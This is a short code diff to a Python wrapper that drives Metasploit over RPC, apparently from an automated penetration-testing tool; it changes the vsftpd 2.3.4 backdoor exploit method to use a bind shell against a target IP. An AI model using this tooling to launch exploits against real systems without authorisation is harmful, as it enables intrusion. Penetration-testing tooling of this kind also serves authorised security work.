@@ -127,13 +127,11 @@ class MetasploitRPCEngine:
             logger.exception("MetasploitRPC exploit failed: %s", module_path)
             return {"status": "failed", "reason": str(exc), "engine": "metasploit"}
 
-    async def exploit_vsftpd(
-        self, target_ip: str, lhost: str = "0.0.0.0"
-    ) -> dict[str, Any]:
-        """Exploit vsftpd 2.3.4 backdoor (T1190)."""
+    async def exploit_vsftpd(self, target_ip: str) -> dict[str, Any]:
+        """Exploit vsftpd 2.3.4 backdoor (T1190) — bind shell, no LHOST needed."""
         module, payload = _EXPLOIT_MAP["vsftpd"]
         return await self._run_exploit(
-            module, payload, {"RHOSTS": target_ip, "LHOST": lhost}
+            module, payload, {"RHOSTS": target_ip}
         )
 
     async def exploit_unrealircd(
